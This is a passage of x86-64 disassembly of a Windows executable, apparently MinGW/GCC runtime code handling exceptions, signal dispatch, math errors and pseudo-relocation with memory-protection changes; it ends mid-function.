  403e98:	5b                   	pop    %rbx
  403e99:	c3                   	ret
  403e9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403ea0:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  403ea5:	0f 84 a7 00 00 00    	je     0x403f52
  403eab:	0f 87 8f 00 00 00    	ja     0x403f40
  403eb1:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  403eb6:	0f 84 96 00 00 00    	je     0x403f52
  403ebc:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  403ec1:	75 cc                	jne    0x403e8f
  403ec3:	31 d2                	xor    %edx,%edx
  403ec5:	b9 0b 00 00 00       	mov    $0xb,%ecx
  403eca:	e8 71 61 00 00       	call   0x40a040
  403ecf:	48 83 f8 01          	cmp    $0x1,%rax
  403ed3:	0f 84 bd 00 00 00    	je     0x403f96
  403ed9:	48 85 c0             	test   %rax,%rax
  403edc:	0f 84 7e 00 00 00    	je     0x403f60
  403ee2:	b9 0b 00 00 00       	mov    $0xb,%ecx
  403ee7:	ff d0                	call   *%rax
  403ee9:	31 c0                	xor    %eax,%eax
  403eeb:	e9 76 ff ff ff       	jmp    0x403e66
  403ef0:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  403ef5:	74 5b                	je     0x403f52
  403ef7:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  403efc:	75 91                	jne    0x403e8f
  403efe:	31 d2                	xor    %edx,%edx
  403f00:	b9 04 00 00 00       	mov    $0x4,%ecx
  403f05:	e8 36 61 00 00       	call   0x40a040
  403f0a:	48 83 f8 01          	cmp    $0x1,%rax
  403f0e:	0f 84 98 00 00 00    	je     0x403fac
  403f14:	48 85 c0             	test   %rax,%rax
  403f17:	74 47                	je     0x403f60
  403f19:	b9 04 00 00 00       	mov    $0x4,%ecx
  403f1e:	ff d0                	call   *%rax
  403f20:	31 c0                	xor    %eax,%eax
  403f22:	e9 3f ff ff ff       	jmp    0x403e66
  403f27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  403f2e:	00 00 
  403f30:	31 db                	xor    %ebx,%ebx
  403f32:	e9 03 ff ff ff       	jmp    0x403e3a
  403f37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  403f3e:	00 00 
  403f40:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  403f45:	74 b7                	je     0x403efe
  403f47:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  403f4c:	0f 85 3d ff ff ff    	jne    0x403e8f
  403f52:	31 c0                	xor    %eax,%eax
  403f54:	48 83 c4 30          	add    $0x30,%rsp
  403f58:	5b                   	pop    %rbx
  403f59:	c3                   	ret
  403f5a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403f60:	b8 04 00 00 00       	mov    $0x4,%eax
  403f65:	48 83 c4 30          	add    $0x30,%rsp
  403f69:	5b                   	pop    %rbx
  403f6a:	c3                   	ret
  403f6b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  403f70:	b9 08 00 00 00       	mov    $0x8,%ecx
  403f75:	e8 c6 60 00 00       	call   0x40a040
  403f7a:	31 c0                	xor    %eax,%eax
  403f7c:	85 db                	test   %ebx,%ebx
  403f7e:	0f 84 e2 fe ff ff    	je     0x403e66
  403f84:	89 44 24 28          	mov    %eax,0x28(%rsp)
  403f88:	e8 b3 0d 00 00       	call   0x404d40
  403f8d:	8b 44 24 28          	mov    0x28(%rsp),%eax
  403f91:	e9 d0 fe ff ff       	jmp    0x403e66
  403f96:	ba 01 00 00 00       	mov    $0x1,%edx
  403f9b:	b9 0b 00 00 00       	mov    $0xb,%ecx
  403fa0:	e8 9b 60 00 00       	call   0x40a040
  403fa5:	31 c0                	xor    %eax,%eax
  403fa7:	e9 ba fe ff ff       	jmp    0x403e66
  403fac:	ba 01 00 00 00       	mov    $0x1,%edx
  403fb1:	b9 04 00 00 00       	mov    $0x4,%ecx
  403fb6:	e8 85 60 00 00       	call   0x40a040
  403fbb:	31 c0                	xor    %eax,%eax
  403fbd:	e9 a4 fe ff ff       	jmp    0x403e66
  403fc2:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  403fc9:	1f 84 00 00 00 00 00 
  403fd0:	41 54                	push   %r12
  403fd2:	55                   	push   %rbp
  403fd3:	57                   	push   %rdi
  403fd4:	56                   	push   %rsi
  403fd5:	53                   	push   %rbx
  403fd6:	48 83 ec 20          	sub    $0x20,%rsp
  403fda:	e8 91 0b 00 00       	call   0x404b70
  403fdf:	48 89 c5             	mov    %rax,%rbp
  403fe2:	8b 05 e0 80 0d 00    	mov    0xd80e0(%rip),%eax        # 0x4dc0c8
  403fe8:	85 c0                	test   %eax,%eax
  403fea:	75 25                	jne    0x404011
  403fec:	48 85 ed             	test   %rbp,%rbp
  403fef:	74 20                	je     0x404011
  403ff1:	48 8d 0d 08 56 0d 00 	lea    0xd5608(%rip),%rcx        # 0x4d9600
  403ff8:	c7 05 c6 80 0d 00 01 	movl   $0x1,0xd80c6(%rip)        # 0x4dc0c8
  403fff:	00 00 00 
  404002:	e8 f9 09 00 00       	call   0x404a00
  404007:	48 85 c0             	test   %rax,%rax
  40400a:	74 14                	je     0x404020
  40400c:	b8 01 00 00 00       	mov    $0x1,%eax
  404011:	48 83 c4 20          	add    $0x20,%rsp
  404015:	5b                   	pop    %rbx
  404016:	5e                   	pop    %rsi
  404017:	5f                   	pop    %rdi
  404018:	5d                   	pop    %rbp
  404019:	41 5c                	pop    %r12
  40401b:	c3                   	ret
  40401c:	0f 1f 40 00          	nopl   0x0(%rax)
  404020:	48 8d 35 b9 80 0d 00 	lea    0xd80b9(%rip),%rsi        # 0x4dc0e0
  404027:	b9 30 00 00 00       	mov    $0x30,%ecx
  40402c:	4c 8d 25 2d 82 0d 00 	lea    0xd822d(%rip),%r12        # 0x4dc260
  404033:	31 db                	xor    %ebx,%ebx
  404035:	48 89 f7             	mov    %rsi,%rdi
  404038:	f3 48 ab             	rep stos %rax,(%rdi)
  40403b:	4c 89 e7             	mov    %r12,%rdi
  40403e:	b1 20                	mov    $0x20,%cl
  404040:	f3 48 ab             	rep stos %rax,(%rdi)
  404043:	48 8d 3d d6 fd ff ff 	lea    -0x22a(%rip),%rdi        # 0x403e20
  40404a:	48 29 ef             	sub    %rbp,%rdi
  40404d:	eb 33                	jmp    0x404082
  40404f:	90                   	nop
  404050:	48 8d 05 0d 82 0d 00 	lea    0xd820d(%rip),%rax        # 0x4dc264
  404057:	41 c6 04 dc 09       	movb   $0x9,(%r12,%rbx,8)
  40405c:	89 3c d8             	mov    %edi,(%rax,%rbx,8)
  40405f:	8b 42 0c             	mov    0xc(%rdx),%eax
  404062:	89 06                	mov    %eax,(%rsi)
  404064:	03 42 08             	add    0x8(%rdx),%eax
  404067:	49 8d 14 dc          	lea    (%r12,%rbx,8),%rdx
  40406b:	48 83 c3 01          	add    $0x1,%rbx
  40406f:	48 29 ea             	sub    %rbp,%rdx
  404072:	89 56 08             	mov    %edx,0x8(%rsi)
  404075:	89 46 04             	mov    %eax,0x4(%rsi)
  404078:	48 83 c6 0c          	add    $0xc,%rsi
  40407c:	48 83 fb 20          	cmp    $0x20,%rbx
  404080:	74 33                	je     0x4040b5
  404082:	48 89 d9             	mov    %rbx,%rcx
  404085:	e8 76 0a 00 00       	call   0x404b00
  40408a:	48 85 c0             	test   %rax,%rax
  40408d:	48 89 c2             	mov    %rax,%rdx
  404090:	75 be                	jne    0x404050
  404092:	48 85 db             	test   %rbx,%rbx
  404095:	0f 84 71 ff ff ff    	je     0x40400c
  40409b:	89 da                	mov    %ebx,%edx
  40409d:	0f 1f 00             	nopl   (%rax)
  4040a0:	49 89 e8             	mov    %rbp,%r8
  4040a3:	48 8d 0d 36 80 0d 00 	lea    0xd8036(%rip),%rcx        # 0x4dc0e0
  4040aa:	ff 15 98 a5 0d 00    	call   *0xda598(%rip)        # 0x4de648
  4040b0:	e9 57 ff ff ff       	jmp    0x40400c
  4040b5:	ba 20 00 00 00       	mov    $0x20,%edx
  4040ba:	eb e4                	jmp    0x4040a0
  4040bc:	0f 1f 40 00          	nopl   0x0(%rax)
  4040c0:	56                   	push   %rsi
  4040c1:	53                   	push   %rbx
  4040c2:	48 83 ec 28          	sub    $0x28,%rsp
  4040c6:	48 8b 11             	mov    (%rcx),%rdx
  4040c9:	48 89 cb             	mov    %rcx,%rbx
  4040cc:	8b 02                	mov    (%rdx),%eax
  4040ce:	89 c1                	mov    %eax,%ecx
  4040d0:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
  4040d6:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
  4040dc:	0f 84 8e 00 00 00    	je     0x404170
  4040e2:	3d 91 00 00 c0       	cmp    $0xc0000091,%eax
  4040e7:	76 47                	jbe    0x404130
  4040e9:	3d 94 00 00 c0       	cmp    $0xc0000094,%eax
  4040ee:	0f 84 2c 01 00 00    	je     0x404220
  4040f4:	0f 86 d6 00 00 00    	jbe    0x4041d0
  4040fa:	3d 95 00 00 c0       	cmp    $0xc0000095,%eax
  4040ff:	74 5d                	je     0x40415e
  404101:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  404106:	0f 84 e4 00 00 00    	je     0x4041f0
  40410c:	0f 1f 40 00          	nopl   0x0(%rax)
  404110:	48 8b 05 a9 7f 0d 00 	mov    0xd7fa9(%rip),%rax        # 0x4dc0c0
  404117:	48 85 c0             	test   %rax,%rax
  40411a:	74 47                	je     0x404163
  40411c:	48 89 d9             	mov    %rbx,%rcx
  40411f:	48 83 c4 28          	add    $0x28,%rsp
  404123:	5b                   	pop    %rbx
  404124:	5e                   	pop    %rsi
  404125:	48 ff e0             	rex.W jmp *%rax
  404128:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40412f:	00 
  404130:	3d 8d 00 00 c0       	cmp    $0xc000008d,%eax
  404135:	72 49                	jb     0x404180
  404137:	be 01 00 00 00       	mov    $0x1,%esi
  40413c:	31 d2                	xor    %edx,%edx
  40413e:	b9 08 00 00 00       	mov    $0x8,%ecx
  404143:	e8 f8 5e 00 00       	call   0x40a040
  404148:	48 83 f8 01          	cmp    $0x1,%rax
  40414c:	0f 84 fe 00 00 00    	je     0x404250
  404152:	48 85 c0             	test   %rax,%rax
  404155:	74 b9                	je     0x404110
  404157:	b9 08 00 00 00       	mov    $0x8,%ecx
  40415c:	ff d0                	call   *%rax
  40415e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  404163:	48 83 c4 28          	add    $0x28,%rsp
  404167:	5b                   	pop    %rbx
  404168:	5e                   	pop    %rsi
  404169:	c3                   	ret
  40416a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  404170:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
  404174:	0f 85 68 ff ff ff    	jne    0x4040e2
  40417a:	eb e2                	jmp    0x40415e
  40417c:	0f 1f 40 00          	nopl   0x0(%rax)
  404180:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  404185:	74 d7                	je     0x40415e
  404187:	0f 87 a3 00 00 00    	ja     0x404230
  40418d:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  404192:	74 ca                	je     0x40415e
  404194:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  404199:	0f 85 71 ff ff ff    	jne    0x404110
  40419f:	31 d2                	xor    %edx,%edx
  4041a1:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4041a6:	e8 95 5e 00 00       	call   0x40a040
  4041ab:	48 83 f8 01          	cmp    $0x1,%rax
  4041af:	0f 84 c0 00 00 00    	je     0x404275
  4041b5:	48 85 c0             	test   %rax,%rax
  4041b8:	0f 84 52 ff ff ff    	je     0x404110
  4041be:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4041c3:	ff d0                	call   *%rax
  4041c5:	eb 97                	jmp    0x40415e
  4041c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4041ce:	00 00 
  4041d0:	3d 92 00 00 c0       	cmp    $0xc0000092,%eax
  4041d5:	74 87                	je     0x40415e
  4041d7:	3d 93 00 00 c0       	cmp    $0xc0000093,%eax
  4041dc:	0f 85 2e ff ff ff    	jne    0x404110
  4041e2:	e9 50 ff ff ff       	jmp    0x404137
  4041e7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4041ee:	00 00 
  4041f0:	31 d2                	xor    %edx,%edx
  4041f2:	b9 04 00 00 00       	mov    $0x4,%ecx
  4041f7:	e8 44 5e 00 00       	call   0x40a040
  4041fc:	48 83 f8 01          	cmp    $0x1,%rax
  404200:	0f 84 83 00 00 00    	je     0x404289
  404206:	48 85 c0             	test   %rax,%rax
  404209:	0f 84 01 ff ff ff    	je     0x404110
  40420f:	b9 04 00 00 00       	mov    $0x4,%ecx
  404214:	ff d0                	call   *%rax
  404216:	e9 43 ff ff ff       	jmp    0x40415e
  40421b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  404220:	31 f6                	xor    %esi,%esi
  404222:	e9 15 ff ff ff       	jmp    0x40413c
  404227:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40422e:	00 00 
  404230:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  404235:	74 b9                	je     0x4041f0
  404237:	3d 8c 00 00 c0       	cmp    $0xc000008c,%eax
  40423c:	0f 85 ce fe ff ff    	jne    0x404110
  404242:	e9 17 ff ff ff       	jmp    0x40415e
  404247:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40424e:	00 00 
  404250:	ba 01 00 00 00       	mov    $0x1,%edx
  404255:	b9 08 00 00 00       	mov    $0x8,%ecx
  40425a:	e8 e1 5d 00 00       	call   0x40a040
  40425f:	85 f6                	test   %esi,%esi
  404261:	0f 84 f7 fe ff ff    	je     0x40415e
  404267:	e8 d4 0a 00 00       	call   0x404d40
  40426c:	0f 1f 40 00          	nopl   0x0(%rax)
  404270:	e9 e9 fe ff ff       	jmp    0x40415e
  404275:	ba 01 00 00 00       	mov    $0x1,%edx
  40427a:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40427f:	e8 bc 5d 00 00       	call   0x40a040
  404284:	e9 d5 fe ff ff       	jmp    0x40415e
  404289:	ba 01 00 00 00       	mov    $0x1,%edx
  40428e:	b9 04 00 00 00       	mov    $0x4,%ecx
  404293:	e8 a8 5d 00 00       	call   0x40a040
  404298:	e9 c1 fe ff ff       	jmp    0x40415e
  40429d:	90                   	nop
  40429e:	90                   	nop
  40429f:	90                   	nop
  4042a0:	48 83 ec 58          	sub    $0x58,%rsp
  4042a4:	48 8b 05 b5 80 0d 00 	mov    0xd80b5(%rip),%rax        # 0x4dc360
  4042ab:	48 85 c0             	test   %rax,%rax
  4042ae:	74 2c                	je     0x4042dc
  4042b0:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
  4042b7:	00 00 
  4042b9:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  4042bd:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  4042c2:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
  4042c8:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  4042cd:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
  4042d3:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
  4042d9:	ff d0                	call   *%rax
  4042db:	90                   	nop
  4042dc:	48 83 c4 58          	add    $0x58,%rsp
  4042e0:	c3                   	ret
  4042e1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
  4042e8:	0f 1f 84 00 00 00 00 
  4042ef:	00 
  4042f0:	48 89 0d 69 80 0d 00 	mov    %rcx,0xd8069(%rip)        # 0x4dc360
  4042f7:	e9 4c 5d 00 00       	jmp    0x40a048
  4042fc:	0f 1f 40 00          	nopl   0x0(%rax)
  404300:	56                   	push   %rsi
  404301:	53                   	push   %rbx
  404302:	48 83 ec 78          	sub    $0x78,%rsp
  404306:	0f 29 74 24 40       	movaps %xmm6,0x40(%rsp)
  40430b:	0f 29 7c 24 50       	movaps %xmm7,0x50(%rsp)
  404310:	44 0f 29 44 24 60    	movaps %xmm8,0x60(%rsp)
  404316:	83 39 06             	cmpl   $0x6,(%rcx)
  404319:	76 65                	jbe    0x404380
  40431b:	48 8d 35 d4 53 0d 00 	lea    0xd53d4(%rip),%rsi        # 0x4d96f6
  404322:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
  404328:	48 8b 59 08          	mov    0x8(%rcx),%rbx
  40432c:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
  404331:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
  404336:	e8 15 5d 00 00       	call   0x40a050
  40433b:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
  404342:	48 8d 48 60          	lea    0x60(%rax),%rcx
  404346:	48 8d 15 bb 53 0d 00 	lea    0xd53bb(%rip),%rdx        # 0x4d9708
  40434d:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
  404353:	49 89 d9             	mov    %rbx,%r9
  404356:	49 89 f0             	mov    %rsi,%r8
  404359:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
  40435f:	e8 0c 11 00 00       	call   0x405470
  404364:	90                   	nop
  404365:	0f 28 74 24 40       	movaps 0x40(%rsp),%xmm6
  40436a:	31 c0                	xor    %eax,%eax
  40436c:	0f 28 7c 24 50       	movaps 0x50(%rsp),%xmm7
  404371:	44 0f 28 44 24 60    	movaps 0x60(%rsp),%xmm8
  404377:	48 83 c4 78          	add    $0x78,%rsp
  40437b:	5b                   	pop    %rbx
  40437c:	5e                   	pop    %rsi
  40437d:	c3                   	ret
  40437e:	66 90                	xchg   %ax,%ax
  404380:	8b 11                	mov    (%rcx),%edx
  404382:	48 8d 05 ab 53 0d 00 	lea    0xd53ab(%rip),%rax        # 0x4d9734
  404389:	48 63 14 90          	movslq (%rax,%rdx,4),%rdx
  40438d:	48 01 d0             	add    %rdx,%rax
  404390:	ff e0                	jmp    *%rax
  404392:	48 8d 35 d7 52 0d 00 	lea    0xd52d7(%rip),%rsi        # 0x4d9670
  404399:	eb 87                	jmp    0x404322
  40439b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4043a0:	48 8d 35 69 52 0d 00 	lea    0xd5269(%rip),%rsi        # 0x4d9610
  4043a7:	e9 76 ff ff ff       	jmp    0x404322
  4043ac:	0f 1f 40 00          	nopl   0x0(%rax)
  4043b0:	48 8d 35 78 52 0d 00 	lea    0xd5278(%rip),%rsi        # 0x4d962f
  4043b7:	e9 66 ff ff ff       	jmp    0x404322
  4043bc:	0f 1f 40 00          	nopl   0x0(%rax)
  4043c0:	48 8d 35 89 52 0d 00 	lea    0xd5289(%rip),%rsi        # 0x4d9650
  4043c7:	e9 56 ff ff ff       	jmp    0x404322
  4043cc:	0f 1f 40 00          	nopl   0x0(%rax)
  4043d0:	48 8d 35 e9 52 0d 00 	lea    0xd52e9(%rip),%rsi        # 0x4d96c0
  4043d7:	e9 46 ff ff ff       	jmp    0x404322
  4043dc:	0f 1f 40 00          	nopl   0x0(%rax)
  4043e0:	48 8d 35 b1 52 0d 00 	lea    0xd52b1(%rip),%rsi        # 0x4d9698
  4043e7:	e9 36 ff ff ff       	jmp    0x404322
  4043ec:	90                   	nop
  4043ed:	90                   	nop
  4043ee:	90                   	nop
  4043ef:	90                   	nop
  4043f0:	31 c0                	xor    %eax,%eax
  4043f2:	c3                   	ret
  4043f3:	90                   	nop
  4043f4:	90                   	nop
  4043f5:	90                   	nop
  4043f6:	90                   	nop
  4043f7:	90                   	nop
  4043f8:	90                   	nop
  4043f9:	90                   	nop
  4043fa:	90                   	nop
  4043fb:	90                   	nop
  4043fc:	90                   	nop
  4043fd:	90                   	nop
  4043fe:	90                   	nop
  4043ff:	90                   	nop
  404400:	56                   	push   %rsi
  404401:	53                   	push   %rbx
  404402:	48 83 ec 38          	sub    $0x38,%rsp
  404406:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
  40440b:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  404410:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  404415:	48 89 cb             	mov    %rcx,%rbx
  404418:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
  40441d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  404422:	e8 29 5c 00 00       	call   0x40a050
  404427:	48 8d 15 22 53 0d 00 	lea    0xd5322(%rip),%rdx        # 0x4d9750
  40442e:	48 8d 48 60          	lea    0x60(%rax),%rcx
  404432:	e8 39 10 00 00       	call   0x405470
  404437:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
  40443c:	e8 0f 5c 00 00       	call   0x40a050
  404441:	48 8d 48 60          	lea    0x60(%rax),%rcx
  404445:	48 89 da             	mov    %rbx,%rdx
  404448:	49 89 f0             	mov    %rsi,%r8
  40444b:	e8 60 10 00 00       	call   0x4054b0
  404450:	e8 03 5c 00 00       	call   0x40a058
  404455:	90                   	nop
  404456:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40445d:	00 00 00 
  404460:	41 56                	push   %r14
  404462:	41 55                	push   %r13
  404464:	41 54                	push   %r12
  404466:	55                   	push   %rbp
  404467:	57                   	push   %rdi
  404468:	56                   	push   %rsi
  404469:	53                   	push   %rbx
  40446a:	48 83 ec 60          	sub    $0x60,%rsp
  40446e:	48 89 ce             	mov    %rcx,%rsi
  404471:	8b 0d 09 7f 0d 00    	mov    0xd7f09(%rip),%ecx        # 0x4dc380
  404477:	48 89 d7             	mov    %rdx,%rdi
  40447a:	4c 89 c5             	mov    %r8,%rbp
  40447d:	85 c9                	test   %ecx,%ecx
  40447f:	0f 8e bb 01 00 00    	jle    0x404640
  404485:	48 8b 05 ec 7e 0d 00 	mov    0xd7eec(%rip),%rax        # 0x4dc378
  40448c:	31 db                	xor    %ebx,%ebx
  40448e:	66 90                	xchg   %ax,%ax
  404490:	4c 8b 48 08          	mov    0x8(%rax),%r9
  404494:	4c 39 ce             	cmp    %r9,%rsi
  404497:	72 13                	jb     0x4044ac
  404499:	48 8b 50 10          	mov    0x10(%rax),%rdx
  40449d:	8b 52 08             	mov    0x8(%rdx),%edx
  4044a0:	49 01 d1             	add    %rdx,%r9
  4044a3:	4c 39 ce             	cmp    %r9,%rsi
  4044a6:	0f 82 d4 00 00 00    	jb     0x404580
  4044ac:	83 c3 01             	add    $0x1,%ebx
  4044af:	48 83 c0 18          	add    $0x18,%rax
  4044b3:	39 cb                	cmp    %ecx,%ebx
  4044b5:	75 d9                	jne    0x404490
  4044b7:	48 89 f1             	mov    %rsi,%rcx
  4044ba:	e8 d1 05 00 00       	call   0x404a90
  4044bf:	48 85 c0             	test   %rax,%rax
  4044c2:	49 89 c4             	mov    %rax,%r12
  4044c5:	0f 84 99 01 00 00    	je     0x404664
  4044cb:	48 63 db             	movslq %ebx,%rbx
  4044ce:	4c 8d 6c 24 30       	lea    0x30(%rsp),%r13
  4044d3:	4c 8d 34 5b          	lea    (%rbx,%rbx,2),%r14
  4044d7:	48 8b 1d 9a 7e 0d 00 	mov    0xd7e9a(%rip),%rbx        # 0x4dc378
  4044de:	49 c1 e6 03          	shl    $0x3,%r14
  4044e2:	4c 01 f3             	add    %r14,%rbx
  4044e5:	48 89 43 10          	mov    %rax,0x10(%rbx)
  4044e9:	c7 03 00 00 00 00    	movl   $0x0,(%rbx)
  4044ef:	e8 7c 06 00 00       	call   0x404b70
  4044f4:	41 8b 54 24 0c       	mov    0xc(%r12),%edx
  4044f9:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  4044ff:	48 01 d0             	add    %rdx,%rax
  404502:	4c 89 ea             	mov    %r13,%rdx
  404505:	48 89 43 08          	mov    %rax,0x8(%rbx)
  404509:	48 8b 05 68 7e 0d 00 	mov    0xd7e68(%rip),%rax        # 0x4dc378
  404510:	48 8b 1d 81 a1 0d 00 	mov    0xda181(%rip),%rbx        # 0x4de698
  404517:	4a 8b 4c 30 08       	mov    0x8(%rax,%r14,1),%rcx
  40451c:	ff d3                	call   *%rbx
  40451e:	48 85 c0             	test   %rax,%rax
  404521:	0f 84 20 01 00 00    	je     0x404647
  404527:	8b 44 24 54          	mov    0x54(%rsp),%eax
  40452b:	83 f8 04             	cmp    $0x4,%eax
  40452e:	0f 85 c1 00 00 00    	jne    0x4045f5
  404534:	83 05 45 7e 0d 00 01 	addl   $0x1,0xd7e45(%rip)        # 0x4dc380
  40453b:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  404541:	4c 89 ea             	mov    %r13,%rdx
  404544:	48 89 f1             	mov    %rsi,%rcx
  404547:	ff d3                	call   *%rbx
  404549:	48 85 c0             	test   %rax,%rax
  40454c:	0f 84 21 01 00 00    	je     0x404673
  404552:	8b 44 24 54          	mov    0x54(%rsp),%eax
  404556:	83 f8 04             	cmp    $0x4,%eax
  404559:	75 35                	jne    0x404590
  40455b:	49 89 e8             	mov    %rbp,%r8
  40455e:	48 89 fa             	mov    %rdi,%rdx
  404561:	48 89 f1             	mov    %rsi,%rcx
  404564:	48 83 c4 60          	add    $0x60,%rsp
  404568:	5b                   	pop    %rbx
  404569:	5e                   	pop    %rsi
  40456a:	5f                   	pop    %rdi
  40456b:	5d                   	pop    %rbp
  40456c:	41 5c                	pop    %r12
  40456e:	41 5d                	pop    %r13
  404570:	41 5e                	pop    %r14
  404572:	e9 f1 59 00 00       	jmp    0x409f68
  404577:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40457e:	00 00 
  404580:	4c 8d 6c 24 30       	lea    0x30(%rsp),%r13
  404585:	48 8b 1d 0c a1 0d 00 	mov    0xda10c(%rip),%rbx        # 0x4de698
  40458c:	eb ad                	jmp    0x40453b
  40458e:	66 90                	xchg   %ax,%ax
  404590:	83 f8 40             	cmp    $0x40,%eax
  404593:	74 c6                	je     0x40455b
  404595:	4c 8d 4c 24 2c       	lea    0x2c(%rsp),%r9
  40459a:	41 b8 40 00 00 00    	mov    $0x40,%r8d
  4045a0:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  4045a5:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  4045aa:	48 8b 1d df a0 0d 00 	mov    0xda0df(%rip),%rbx        # 0x4de690
  4045b1:	ff d3                	call   *%rbx
  4045b3:	49 89 e8             	mov    %rbp,%r8
  4045b6:	48 89 fa             	mov    %rdi,%rdx
  4045b9:	48 89 f1             	mov    %rsi,%rcx
  4045bc:	e8 a7 59 00 00       	call   0x409f68
  4045c1:	8b 44 24 54          	mov    0x54(%rsp),%eax
  4045c5:	83 f8 40             	cmp    $0x40,%eax
  4045c8:	74 1c                	je     0x4045e6
  4045ca:	83 f8 04             	cmp    $0x4,%eax
  4045cd:	74 17                	je     0x4045e6
  4045cf:	4c 8d 4c 24 2c       	lea    0x2c(%rsp),%r9
  4045d4:	44 8b 44 24 2c       	mov    0x2c(%rsp),%r8d
  4045d9:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  4045de:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  4045e3:	ff d3                	call   *%rbx
  4045e5:	90                   	nop
  4045e6:	48 83 c4 60          	add    $0x60,%rsp
  4045ea:	5b                   	pop    %rbx
  4045eb:	5e                   	pop    %rsi
  4045ec:	5f                   	pop    %rdi
  4045ed:	5d                   	pop    %rbp
  4045ee:	41 5c                	pop    %r12
  4045f0:	41 5d                	pop    %r13
  4045f2:	41 5e                	pop    %r14
  4045f4:	c3                   	ret
  4045f5:	83 f8 40             	cmp    $0x40,%eax
  4045f8:	0f 84 36 ff ff ff    	je     0x404534
  4045fe:	4c 8b 0d 73 7d 0d 00 	mov    0xd7d73(%rip),%r9        # 0x4dc378
  404605:	41 b8 40 00 00 00    	mov    $0x40,%r8d
  40460b:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  404610:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404615:	4d 01 f1             	add    %r14,%r9
  404618:	ff 15 72 a0 0d 00    	call   *0xda072(%rip)        # 0x4de690
  40461e:	85 c0                	test   %eax,%eax
  404620:	0f 85 0e ff ff ff    	jne    0x404534
  404626:	ff 15 74 9f 0d 00    	call   *0xd9f74(%rip)        # 0x4de5a0
  40462c:	48 8d 0d 95 51 0d 00 	lea    0xd5195(%rip),%rcx        # 0x4d97c8
  404633:	89 c2                	mov    %eax,%edx
  404635:	e8 c6 fd ff ff       	call   0x404400
  40463a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  404640:	31 db                	xor    %ebx,%ebx
  404642:	e9 70 fe ff ff       	jmp    0x4044b7
  404647:	48 8b 05 2a 7d 0d 00 	mov    0xd7d2a(%rip),%rax        # 0x4dc378
  40464e:	41 8b 54 24 08       	mov    0x8(%r12),%edx
  404653:	48 8d 0d 36 51 0d 00 	lea    0xd5136(%rip),%rcx        # 0x4d9790
  40465a:	4e 8b 44 30 08       	mov    0x8(%rax,%r14,1),%r8
  40465f:	e8 9c fd ff ff       	call   0x404400
  404664:	48 8d 0d 05 51 0d 00 	lea    0xd5105(%rip),%rcx        # 0x4d9770
  40466b:	48 89 f2             	mov    %rsi,%rdx
  40466e:	e8 8d fd ff ff       	call   0x404400
  404673:	48 8d 0d 16 51 0d 00 	lea    0xd5116(%rip),%rcx        # 0x4d9790
  40467a:	49 89 f0             	mov    %rsi,%r8
